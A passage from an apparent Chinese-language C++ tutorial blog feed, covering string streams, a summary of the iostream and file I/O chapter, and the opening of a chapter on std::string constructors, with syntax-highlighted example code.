class="comment">// 4. 输出或使用该字符串</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Formatted Output String ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; formatted_string &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">/* Output:</span></span><br><span class="line"><span class="comment">       Item: Gadget</span></span><br><span class="line"><span class="comment">       Quantity: 3</span></span><br><span class="line"><span class="comment">       Price: $12.99</span></span><br><span class="line"><span class="comment">       Total: $38.97</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ostringstream 对象可以重用，但内容会继续累加</span></span><br><span class="line">    <span class="comment">// oss &lt;&lt; &quot;\nAnother line.&quot;;</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;\nAfter adding more:\n&quot; &lt;&lt; oss.str() &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果要清空并重用，可以调用 str(&quot;&quot;) 或重新构造</span></span><br><span class="line">    oss.str(<span class="string">&quot;&quot;</span>); <span class="comment">// 清空缓冲区</span></span><br><span class="line">    oss.clear(); <span class="comment">// 清除可能存在的流状态 (虽然这里通常不需要)</span></span><br><span class="line">    oss &lt;&lt; <span class="string">&quot;New content.&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAfter clearing and adding:\n&quot;</span> &lt;&lt; oss.str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// Output: New content.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ostringstream</code> 常用于需要动态构建包含数值和其他数据的日志消息、文件名或显示文本的场景。</p><h3 id="使用-istringstream-进行格式化输入"><a href="#使用-istringstream-进行格式化输入" class="headerlink" title="使用 istringstream 进行格式化输入"></a>使用 <code>istringstream</code> 进行格式化输入</h3><p>当你有一个字符串，并且想从中按特定格式提取数据（例如，解析配置文件的一行或用户输入的复合数据）时，<code>istringstream</code> 非常有用。</p><p><strong>步骤:</strong></p><ol><li> 包含头文件 <code>#include &lt;sstream&gt;</code>。</li><li> 准备好包含待解析数据的 <code>std::string</code>。</li><li> 使用该字符串创建一个 <code>istringstream</code> 对象。</li><li> 像使用 <code>cin</code> 一样，使用 <code>&gt;&gt;</code> 从流中提取数据到变量中。</li><li> 可以检查流的状态（如 <code>good()</code>, <code>fail()</code>, <code>eof()</code>) 来判断提取是否成功。</li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> data = <span class="string">&quot;Alice 30 95.5&quot;</span>; <span class="comment">// 模拟一行数据</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> config_line = <span class="string">&quot;window_width = 800&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> csv_data = <span class="string">&quot;10,20,30,40&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 解析空格分隔的数据</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">istringstream</span> <span class="title">iss1</span><span class="params">(data)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iss1 &gt;&gt; name &gt;&gt; age &gt;&gt; score) &#123; <span class="comment">// 尝试提取</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Parsed from data: Name=&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot;, Age=&quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Score=&quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse data string.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 解析配置文件行</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">istringstream</span> <span class="title">iss2</span><span class="params">(config_line)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> key, eq;</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">if</span> (iss2 &gt;&gt; key &gt;&gt; eq &gt;&gt; value &amp;&amp; key == <span class="string">&quot;window_width&quot;</span> &amp;&amp; eq == <span class="string">&quot;=&quot;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Parsed config: Key=&quot;</span> &lt;&lt; key &lt;&lt; <span class="string">&quot;, Value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse config line.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 解析逗号分隔的数据 (需要手动处理分隔符)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">istringstream</span> <span class="title">iss3</span><span class="params">(csv_data)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">char</span> comma;</span><br><span class="line">    <span class="keyword">while</span> (iss3 &gt;&gt; num) &#123; <span class="comment">// 读取一个数字</span></span><br><span class="line">        numbers.push_back(num);</span><br><span class="line">        <span class="keyword">if</span> (iss3 &gt;&gt; comma &amp;&amp; comma == <span class="string">&#x27;,&#x27;</span>) &#123; <span class="comment">// 读取并检查逗号</span></span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 如果有逗号，继续循环</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 如果没有逗号或读取失败，结束循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查流状态，确保是因为到达末尾而不是其他错误</span></span><br><span class="line">    <span class="keyword">if</span> (!iss3.eof() &amp;&amp; iss3.fail() &amp;&amp; !iss3.bad()) &#123;</span><br><span class="line">         <span class="comment">// 可能最后一个数字后面没有逗号，这是正常的</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!iss3.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error parsing CSV data.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Parsed CSV numbers: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>istringstream</code> 常用于解析从文件、网络或用户界面接收到的文本数据。</p><h3 id="使用-stringstream-进行读写"><a href="#使用-stringstream-进行读写" class="headerlink" title="使用 stringstream 进行读写"></a>使用 <code>stringstream</code> 进行读写</h3><p><code>stringstream</code> 允许你在同一个字符串缓冲区上进行输入和输出操作。你可以先向其中写入数据，然后从中读取数据，或者反过来。</p><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">stringstream</span> ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 写入数据到 stringstream</span></span><br><span class="line">    <span class="keyword">int</span> val1 = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">double</span> val2 = <span class="number">3.14</span>;</span><br><span class="line">    ss &lt;&lt; <span class="string">&quot;Data: &quot;</span> &lt;&lt; val1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; val2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 从同一个 stringstream 读取数据</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> label;</span><br><span class="line">    <span class="keyword">int</span> read_val1;</span><br><span class="line">    <span class="keyword">double</span> read_val2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在读取之前，通常不需要显式重置位置，因为写入指针和读取指针是独立的</span></span><br><span class="line">    <span class="comment">// 但如果写入后立即读取，读取指针仍在开头</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ss &gt;&gt; label &gt;&gt; read_val1 &gt;&gt; read_val2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Read from stringstream: Label=&quot;</span> &lt;&lt; label</span><br><span class="line">                  &lt;&lt; <span class="string">&quot;, Val1=&quot;</span> &lt;&lt; read_val1 &lt;&lt; <span class="string">&quot;, Val2=&quot;</span> &lt;&lt; read_val2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to read from stringstream.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 清空并重用，先读取后写入</span></span><br><span class="line">    ss.str(<span class="string">&quot;100 Hello&quot;</span>); <span class="comment">// 设置新的内容，并重置读写位置</span></span><br><span class="line">    ss.clear(); <span class="comment">// 清除 EOF 或其他状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> word;</span><br><span class="line">    ss &gt;&gt; num &gt;&gt; word; <span class="comment">// 读取 100 和 &quot;Hello&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入新内容 (会覆盖或追加，取决于实现和指针位置，通常是覆盖)</span></span><br><span class="line">    <span class="comment">// 为了安全地追加，最好先获取当前内容，追加后再设置回去，或者使用 ostringstream</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> current_content = ss.str(); <span class="comment">// 获取 &quot;100 Hello&quot;</span></span><br><span class="line">    ss.str(<span class="string">&quot;&quot;</span>); <span class="comment">// 清空</span></span><br><span class="line">    ss.clear();</span><br><span class="line">    ss &lt;&lt; current_content &lt;&lt; <span class="string">&quot; World &quot;</span> &lt;&lt; num * <span class="number">2</span>; <span class="comment">// 写入旧内容、新内容和计算结果</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final stringstream content: &quot;</span> &lt;&lt; ss.str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// Output: 100 Hello World 200</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>stringstream</code> 在需要对字符串进行多次格式化转换或解析的场景中很有用，例如在不同格式之间转换数据。</p><p><strong>总结:</strong> 字符串流提供了一种强大而灵活的方式，可以在内存中完成数据的格式化和解析，其接口与标准的控制台和文件 I/O 保持一致，易于学习和使用。</p><h2 id="17-6-总结"><a href="#17-6-总结" class="headerlink" title="17.6 总结"></a>17.6 总结</h2><p>本章详细介绍了 C++ 的输入/输出 (I/O) 系统，该系统基于<strong>流 (Stream)</strong> 的概念，提供了一个统一的接口来处理来自不同源（键盘、文件）和去往不同目的地（屏幕、文件）的数据流。</p><p>主要内容回顾：</p><ol><li><p><strong>I/O 概述:</strong></p><ul><li>  <strong>流:</strong> 字节序列的抽象，用于连接程序和 I/O 设备。</li><li>  <strong>缓冲区:</strong> 临时存储区域，用于提高 I/O 效率。分为完全缓冲、行缓冲、无缓冲。</li><li>  <strong><code>&lt;iostream&gt;</code>:</strong> 提供了核心 I/O 类（<code>ios_base</code>, <code>ios</code>, <code>istream</code>, <code>ostream</code>, <code>iostream</code>）和标准流对象 (<code>cin</code>, <code>cout</code>, <code>cerr</code>, <code>clog</code>)。</li><li>  <strong>重定向:</strong> 操作系统功能，允许改变标准输入/输出/错误流的来源和目的地，而无需修改代码。</li></ul></li><li><p><strong>使用 <code>cout</code> 输出:</strong></p><ul><li>  主要使用重载的插入运算符 (<code>&lt;&lt;</code>) 输出各种数据类型。</li><li>  支持链接操作 (<code>cout &lt;&lt; a &lt;&lt; b;</code>)。</li><li>  提供 <code>put()</code> 输出单个字符，<code>write()</code> 输出指定字节数的内存块。</li><li>  <strong>缓冲区刷新:</strong> 可以通过 <code>endl</code> (换行并刷新)、<code>flush</code> (仅刷新)、<code>ends</code> (插入 <code>\0</code> 并刷新) 或在特定条件下自动刷新。<code>&#39;\n&#39;</code> 只插入换行符。</li><li>  <strong>格式化:</strong> 可以通过成员函数 (<code>width()</code>, <code>precision()</code>, <code>fill()</code>, <code>setf()</code>) 或操纵符 (<code>setw()</code>, <code>setprecision()</code>, <code>setfill()</code>, <code>fixed</code>, <code>scientific</code>, <code>hex</code>, <code>oct</code>, <code>dec</code>, <code>left</code>, <code>right</code>, <code>boolalpha</code> 等，需包含 <code>&lt;iomanip&gt;</code>) 控制输出的宽度、精度、填充、对齐、基数、浮点数表示等。</li></ul></li><li><p><strong>使用 <code>cin</code> 输入:</strong></p><ul><li>  主要使用重载的提取运算符 (<code>&gt;&gt;</code>) 读取数据。默认跳过前导空白，读取直到遇到不匹配字符或空白。</li><li>  <strong>流状态:</strong> <code>cin</code> 维护状态位 (<code>goodbit</code>, <code>eofbit</code>, <code>failbit</code>, <code>badbit</code>)。可以通过 <code>good()</code>, <code>eof()</code>, <code>fail()</code>, <code>bad()</code> 或流对象本身在布尔上下文中检查状态。<code>failbit</code> 表示格式错误，<code>eofbit</code> 表示到达文件尾。</li><li>  <strong>错误处理:</strong> 读取失败后，需使用 <code>clear()</code> 清除错误状态，并使用 <code>ignore()</code> 丢弃缓冲区中的无效输入。</li><li>  <strong>其他方法:</strong> <code>get()</code> (读取单个字符，不跳过空白)、<code>getline()</code> (读取一行到 C 风格数组，丢弃分隔符)、<code>read()</code> (读取指定字节数)、<code>peek()</code> (查看下一个字符)、<code>gcount()</code> (获取上次读取的字符数)、<code>putback()</code> (放回字符)、<code>ignore()</code> (丢弃字符)。</li></ul></li><li><p><strong>文件 I/O (<code>&lt;fstream&gt;</code>):</strong></p><ul><li>  使用 <code>ifstream</code> (输入)、<code>ofstream</code> (输出)、<code>fstream</code> (输入/输出) 类。</li><li>  通过构造函数或 <code>open()</code> 方法关联文件，并指定<strong>文件模式</strong> (<code>in</code>, <code>out</code>, <code>app</code>, <code>ate</code>, <code>binary</code>, <code>trunc</code>)。</li><li>  必须使用 <code>is_open()</code> 或检查流状态来确认文件是否成功打开。</li><li>  使用与 <code>cin</code>/<code>cout</code> 类似的操作符和方法进行读写。</li><li>  文件流对象在销毁时自动关闭文件。</li><li>  可以通过 <code>argc</code> 和 <code>argv</code> 处理命令行参数来指定文件名。</li><li>  <strong>随机存取:</strong> 使用 <code>seekg()</code> / <code>tellg()</code> (输入指针) 和 <code>seekp()</code> / <code>tellp()</code> (输出指针) 在文件中定位读写位置，常用于二进制文件。</li></ul></li><li><p><strong>内核格式化 (<code>&lt;sstream&gt;</code>):</strong></p><ul><li>  在内存中进行格式化转换。</li><li>  <strong><code>ostringstream</code>:</strong> 将各种数据类型格式化输出到一个内部字符串缓冲区，通过 <code>str()</code> 获取结果字符串。</li><li>  <strong><code>istringstream</code>:</strong> 将已有字符串作为输入源，从中按格式解析提取数据。</li><li>  <strong><code>stringstream</code>:</strong> 支持对同一个内部字符串缓冲区进行读写操作。</li><li>  接口与文件流和控制台流一致，支持格式化操纵符。</li></ul></li></ol><p>C++ 的 iostream 库提供了一个类型安全、可扩展且功能丰富的 I/O 框架，适用于控制台、文件以及内存中的格式化操作。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 16 string 类和标准模板库</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_16/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_16/</url>
      
        <content type="html"><![CDATA[<h2 id="16-1-string-类"><a href="#16-1-string-类" class="headerlink" title="16.1 string 类"></a>16.1 string 类</h2><p>我们在第 4 章已经初步接触了 C++ 标准库中的 <code>string</code> 类。与 C 语言风格的、以空字符结尾的字符数组（C-风格字符串）相比，<code>string</code> 类提供了更强大、更安全、更方便的字符串处理方式。</p><p><strong>优点:</strong></p><ul><li>  <strong>自动内存管理:</strong> <code>string</code> 对象会自动管理存储字符串所需的内存，无需手动分配和释放，避免了许多 C 风格字符串常见的内存错误（如缓冲区溢出）。</li><li>  <strong>丰富的操作:</strong> 提供了大量的成员函数用于字符串的查找、拼接、比较、修改、插入、删除等操作。</li><li>  <strong>安全性:</strong> 成员函数通常会进行边界检查（如 <code>at()</code> 方法），或者提供明确定义的操作行为。</li><li>  <strong>与 STL 兼容:</strong> 可以方便地与标准模板库 (STL) 中的算法和容器一起使用。</li></ul><p><code>string</code> 类实际上是模板类 <code>basic_string&lt;char&gt;</code> 的一个 <code>typedef</code>（类型别名）。它定义在 <code>&lt;string&gt;</code> 头文件中。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 必须包含此头文件</span></span></span><br></pre></td></tr></table></figure><h3 id="16-1-1-构造字符串"><a href="#16-1-1-构造字符串" class="headerlink" title="16.1.1 构造字符串"></a>16.1.1 构造字符串</h3><p>创建 <code>string</code> 对象有多种方式（构造函数）：</p><ol><li><strong>默认构造函数:</strong> 创建一个空字符串。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s1; <span class="comment">// s1 是一个空字符串 &quot;&quot;</span></span><br></pre></td></tr></table></figure></li><li>*<em>从 C 风格字符串 (const char</em>)**: 用一个 C 风格字符串来初始化 <code>string</code> 对象。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>; <span class="comment">// 从字符串字面值初始化</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* c_str = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(c_str)</span></span>; <span class="comment">// 从 const char* 变量初始化</span></span><br></pre></td></tr></table></figure></li><li><strong>复制构造函数:</strong> 用另一个 <code>string</code> 对象来初始化。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s4 = s2; <span class="comment">// s4 的内容是 &quot;Hello&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s5</span><span class="params">(s4)</span></span>;  <span class="comment">// s5 的内容也是 &quot;Hello&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>从 C 风格字符串的部分内容:</strong> 用 C 风格字符串的前 <code>n</code> 个字符初始化。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* long_cstr = <span class="string">&quot;Programming&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s6</span><span class="params">(long_cstr, <span class="number">7</span>)</span></span>; <span class="comment">// 用 &quot;Programming&quot; 的前 7 个字符初始化 s6，内容是 &quot;Program&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>从 <code>string</code> 对象的部分内容 (子字符串):</strong> 用另一个 <code>string</code> 对象的子字符串初始化。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s7 = <span class="string">&quot;Example String&quot;</span>;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s8</span><span class="params">(s7, <span class="number">8</span>, <span class="number">6</span>)</span></span>; <span class="comment">// 从 s7 的索引 8 开始，取 6 个字符初始化 s8，内容是 &quot;String&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>填充构造函数:</strong> 用 <code>n</code> 个重复的字符 <code>c</code> 初始化。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s9</span><span class="params">(<span class="number">10</span>, <span class="string">&#x27;-&#x27;</span>)</span></span>; <span class="comment">// s9 的内容是 &quot;----------&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>从迭代器范围:</strong> 用一对指向字符序列的迭代器（例如来自另一个容器或 C 风格数组）来初始化。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> char_array[] = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s10</span><span class="params">(char_array, char_array + <span class="keyword">sizeof</span>(char_array))</span></span>; <span class="comment">// s10 内容是 &quot;Test&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; char_vec = &#123;<span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s11</span><span class="params">(char_vec.begin(), char_vec.end())</span></span>; <span class="comment">// s11 内容是 &quot;Data&quot;</span></span><br></pre></td></tr></table></figure></li><li><strong>使用初始化列表 (C++11):</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s12 = &#123;<span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;t&#x27;</span>&#125;; <span class="comment">// s12 内容是 &quot;Init&quot;</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s13 &#123;<span class="string">&quot;List&quot;</span>&#125;; <span class="comment">// s13 内容是 &quot;List&quot;</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s3</span><span class="params">(s2)</span></span>;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="number">5</span>, <span 